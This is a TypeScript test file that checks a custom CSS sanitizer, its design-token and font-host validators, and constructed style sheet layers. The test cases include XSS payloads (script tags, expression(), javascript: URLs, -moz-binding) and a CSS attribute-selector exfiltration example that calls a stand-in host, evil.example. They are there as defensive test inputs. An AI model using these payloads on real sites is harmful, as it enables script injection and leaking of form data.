import { describe, expect, it } from "vitest";
import { normalizeFontHost, sanitizeCustomCss, sanitizeTokenValue, tokenStyleSheet, type CssIssueCode } from "./customCss";
import { applyStyleLayer } from "./styleSheets";

function issueCodes(input: string, policy?: Parameters<typeof sanitizeCustomCss>[1]): CssIssueCode[] {
  return sanitizeCustomCss(input, policy).issues.map((issue) => issue.code);
}

/** Nothing executable or remote may survive, whatever the input. */
function assertInert(css: string) {
  expect(css).not.toMatch(/<|\\|expression\s*\(|javascript:|vbscript:|@import|behavior|binding|image-set|https?:|\/\//i);
}

describe("custom CSS sanitizer (G33.4)", () => {
  it("keeps ordinary rules, media queries, keyframes and same-site URLs", () => {
    const input = `
      /* brand */
      .jl-header { background: var(--jl-color-surface); border-bottom: 2px solid #2f5bd3 !important }
      a > span, h1:hover { color: rgb(10 20 30 / 50%) }
      @media (max-width: 640px) { .jl-main { padding: 8px } }
      @keyframes pulse { from { opacity: 0.5 } 50% { opacity: 1 } to { opacity: 0.5 } }
      body { background-image: url("/images/Primary/abc?width=300"); }
      input[type="search"] { border-radius: 4px; }
    `;
    const result = sanitizeCustomCss(input);
    expect(result.rejected).toBe(false);
    expect(result.issues).toEqual([]);
    expect(result.css).toContain(".jl-header{background:var(--jl-color-surface);border-bottom:2px solid #2f5bd3 !important}");
    expect(result.css).toContain("a > span, h1:hover{color:rgb(10 20 30 / 50%)}");
    expect(result.css).toContain("@media (max-width: 640px){.jl-main{padding:8px}}");
    expect(result.css).toContain("@keyframes pulse{from{opacity:0.5}50%{opacity:1}to{opacity:0.5}}");
    expect(result.css).toContain('url("/images/Primary/abc?width=300")');
    expect(result.css).toContain('input[type="search"]{border-radius:4px}');
  });

  it.each<[string, string, CssIssueCode]>([
    ["script tag", "</style><script>alert(1)</script>", "markup"],
    ["script tag inside a value", 'body { content: "<script>alert(1)</script>" }', "markup"],
    ["HTML comment", "<!-- body{} -->", "markup"],
    ["escaped expression", "div { width: \\65 xpression(alert(1)) }", "escape"],
    ["escaped url", "div { background: \\75rl(https://evil.example/x) }", "escape"],
    ["NUL byte", "div { color: red\u0000 }", "control_char"],
    ["line separator", "div { color: red\u2028 }", "control_char"],
    ["unterminated comment", "div { color: red } /* body { background: url(https://evil.example) }", "unterminated_comment"],
    ["extra closing brace", "a { color: red } } body { background: url(https://evil.example/x) }", "unbalanced"],
    ["unclosed block", "a { color: red", "unbalanced"],
    ["unclosed string", 'a { content: "x }', "unbalanced"],
  ])("refuses the whole input on %s", (_name, input, code) => {
    const result = sanitizeCustomCss(input);
    expect(result.rejected).toBe(true);
    expect(result.css).toBe("");
    expect(result.issues.map((issue) => issue.code)).toEqual([code]);
  });

  it.each<[string, string, CssIssueCode]>([
    ["expression()", "div { width: expression(alert(1)); color: red }", "expression"],
    ["expression() with spaces", "div { width: EXPRESSION (alert(1)); color: red }", "expression"],
    ["javascript: URL", "div { background: url(javascript:alert(1)); color: red }", "script_url"],
    ["quoted javascript: URL", "div { background: url('JavaScript:alert(1)'); color: red }", "script_url"],
    ["vbscript: URL", "div { background: url(vbscript:msgbox(1)); color: red }", "script_url"],
    ["external url()", "div { background: url(https://evil.example/x.png); color: red }", "external_url"],
    ["protocol-relative url()", "div { background: url(//evil.example/x.png); color: red }", "external_url"],
    ["data: URL", "div { background: url(data:image/svg+xml;base64,PHN2Zz4=); color: red }", "external_url"],
    ["exfiltration selector", 'input[value^="a"] { background: url(https://evil.example/?a); color: red }', "external_url"],
    ["image-set()", 'div { background-image: image-set("https://evil.example/x.png" 1x); color: red }', "blocked_function"],
    ["-webkit-image-set()", 'div { background-image: -webkit-image-set("https://evil.example/x.png" 1x); color: red }', "blocked_function"],
    ["src()", 'div { background-image: src("https://evil.example/x.png"); color: red }', "blocked_function"],
    ["attr() as URL", "div { background-image: attr(data-x url); color: red }", "blocked_function"],
    ["behavior", "div { behavior: url(/x.htc); color: red }", "binding"],
    ["-moz-binding", "div { -moz-binding: url(/x.xml#xss); color: red }", "binding"],
    ["nested rule", "div { color: red; span { color: blue } }", "nesting_unsupported"],
  ])("drops %s and keeps the rest", (_name, input, code) => {
    const result = sanitizeCustomCss(input);
    expect(result.rejected).toBe(false);
    expect(result.issues.map((issue) => issue.code)).toContain(code);
    expect(result.css).toBe("div{color:red}".replace("div", input.trim().split("{")[0]!.trim()));
    assertInert(result.css);
  });

  it.each<[string, string, CssIssueCode]>([
    ["@import url()", "@import url(https://evil.example/x.css); a { color: red }", "import_blocked"],
    ["@import string", '@import "/local.css"; a { color: red }', "import_blocked"],
    ["@IMPORT upper case", "@IMPORT url(x.css); a { color: red }", "import_blocked"],
    ["@charset", '@charset "utf-8"; a { color: red }', "at_rule_blocked"],
    ["@namespace", "@namespace svg url(http://www.w3.org/2000/svg); a { color: red }", "at_rule_blocked"],
    ["@document", "@document url(https://evil.example) { a { color: blue } } a { color: red }", "at_rule_blocked"],
    ["@media with url()", "@media (min-width: url(x)) { a { color: blue } } a { color: red }", "at_rule_blocked"],
  ])("drops %s", (_name, input, code) => {
    const result = sanitizeCustomCss(input);
    expect(result.issues.map((issue) => issue.code)).toContain(code);
    expect(result.css).toBe("a{color:red}");
  });

  it("treats comments as separators, so a split keyword cannot be reassembled", () => {
    const result = sanitizeCustomCss("div { width: expr/**/ession(alert(1)) }");
    expect(result.css).not.toMatch(/expression/i);
    expect(result.css).toBe("div{width:expr ession(alert(1))}");
  });

  it("refuses selectors with characters outside CSS selectors", () => {
    expect(issueCodes("a;b { color: red }")).toContain("invalid_selector");
    expect(issueCodes("@x { } a@b { color: red }")).toContain("at_rule_blocked");
  });

  it("blocks external fonts by default and allows allowlisted https hosts only when enabled", () => {
    const face = "@font-face { font-family: Brand; src: url(https://fonts.example.com/brand.woff2) format('woff2') }";
    expect(issueCodes(face)).toEqual(["external_font"]);
    const allowed = sanitizeCustomCss(face, { allowExternalFonts: true, fontHosts: ["fonts.example.com"] });
    expect(allowed.issues).toEqual([]);
    expect(allowed.css).toContain("src:url(https://fonts.example.com/brand.woff2) format('woff2')");
    // Allowlisted host but switched off, other hosts, plain http, credentials
    // and ports stay blocked; fonts never unlock url() outside @font-face.
    expect(issueCodes(face, { allowExternalFonts: false, fontHosts: ["fonts.example.com"] })).toEqual(["external_font"]);
    for (const url of ["https://evil.example/x.woff2", "http://fonts.example.com/x.woff2", "https://user@fonts.example.com/x.woff2", "https://fonts.example.com:8443/x.woff2", "https://fonts.example.com.evil.example/x.woff2"]) {
      expect(issueCodes(`@font-face { font-family: B; src: url(${url}) }`, { allowExternalFonts: true, fontHosts: ["fonts.example.com"] })).toEqual(["external_font"]);
    }
    expect(issueCodes("body { background: url(https://fonts.example.com/x.png) }", { allowExternalFonts: true, fontHosts: ["fonts.example.com"] })).toEqual(["external_url"]);
  });

  it("limits the input size", () => {
    expect(sanitizeCustomCss("a{color:red}".repeat(7000)).issues[0]?.code).toBe("too_long");
  });

  it("normalizes font hosts", () => {
    expect(normalizeFontHost(" Fonts.Example.COM ")).toBe("fonts.example.com");
    for (const bad of ["https://fonts.example.com", "fonts.example.com/x", "localhost", "*.example.com", "fonts..example.com"]) {
      expect(normalizeFontHost(bad)).toBeNull();
    }
  });

  it("checks design token values", () => {
    expect(sanitizeTokenValue("#0f766e")).toBe("#0f766e");
    expect(sanitizeTokenValue(" 14px ")).toBe("14px");
    expect(sanitizeTokenValue('"Noto Sans", sans-serif', true)).toBe('"Noto Sans", sans-serif');
    for (const bad of ["red; } body { display: none", "url(/x.png)", "expression(alert(1))", "javascript:alert(1)", '"x"', "a<b", "\\65", "", "image-set('x' 1x)"]) {
      expect(sanitizeTokenValue(bad), bad).toBeNull();
    }
  });
});

describe("constructed style sheets", () => {
  it("adds, orders, replaces and removes layers without touching other sheets", () => {
    const foreign = new CSSStyleSheet();
    const target = { adoptedStyleSheets: [foreign] };
    expect(applyStyleLayer("custom-css", "a{color:red}", target)).toBe(true);
    expect(applyStyleLayer("plugin-tokens", ":root{--jl-color-primary:#000}", target)).toBe(true);
    const [first, tokens, custom] = target.adoptedStyleSheets;
    expect(first).toBe(foreign);
    // Administrator CSS comes last, so it wins over plugin tokens.
    expect(tokens?.cssRules[0]?.cssText).toContain("--jl-color-primary");
    expect(custom?.cssRules[0]?.cssText).toContain("color: red");
    applyStyleLayer("custom-css", "", target);
    expect(target.adoptedStyleSheets).toEqual([foreign, tokens]);
  });

  it("reports when constructed style sheets are unavailable instead of inlining <style>", () => {
    const before = document.head.innerHTML;
    expect(applyStyleLayer("custom-css", "a{color:red}", {})).toBe(false);
    expect(applyStyleLayer("custom-css", "a{color:red}", document)).toBe("adoptedStyleSheets" in document);
    expect(document.head.innerHTML).toBe(before);
  });
});

describe("shared cases with the server sanitizer", () => {
  // internal/domain/customcss.go reads the same file: both sides must agree.
  it("matches every recorded result", async () => {
    const { default: cases } = (await import("./customCss.cases.json")) as unknown as {
      default: {
        css: {
          input?: string;
          repeat?: { prefix: string; unit: string; times: number; suffix: string };
          policy?: { allowExternalFonts: boolean; fontHosts: string[] };
          css?: string;
          cssLength?: number;
          rejected: boolean;
          issues: string[];
        }[];
        tokens: { value: string; allowQuotes: boolean; result: string | null }[];
        hosts: { value: string; result: string | null }[];
      };
    };
    expect(cases.css.length).toBeGreaterThan(80);
    for (const entry of cases.css) {
      const input = entry.input ?? (entry.repeat ? entry.repeat.prefix + entry.repeat.unit.repeat(entry.repeat.times) + entry.repeat.suffix : "");
      const result = sanitizeCustomCss(input, entry.policy);
      expect({ rejected: result.rejected, issues: result.issues.map((issue) => issue.code) }, input.slice(0, 80)).toEqual({ rejected: entry.rejected, issues: entry.issues });
      if (entry.css !== undefined) {
        expect(result.css, input.slice(0, 80)).toBe(entry.css);
      } else {
        expect(result.css.length).toBe(entry.cssLength);
      }
    }
    for (const entry of cases.tokens) {
      expect(sanitizeTokenValue(entry.value, entry.allowQuotes), entry.value).toBe(entry.result);
    }
    for (const entry of cases.hosts) {
      expect(normalizeFontHost(entry.value), entry.value).toBe(entry.result);
    }
  });

  it("refuses IP addresses as font hosts, like the server's CSP builder", () => {
    expect(normalizeFontHost("10.0.0.1")).toBeNull();
    expect(normalizeFontHost("fonts.example.123")).toBeNull();
  });

  it("builds token sheets from known names and safe values only", () => {
    const names = new Set(["color-primary", "font-family"]);
    expect(tokenStyleSheet({}, {}, names)).toBe("");
    const css = tokenStyleSheet({ "color-primary": " #0f766e ", unknown: "red", "font-family": '"Noto Sans", serif' }, { "color-primary": "url(/x)" }, names);
    expect(css).toContain(':root{--jl-color-primary:#0f766e;--jl-font-family:"Noto Sans", serif}');
    expect(css).not.toContain("unknown");
    expect(css).not.toContain("url(");
    expect(css).toContain(':root[data-theme="dark"]{}');
  });
});
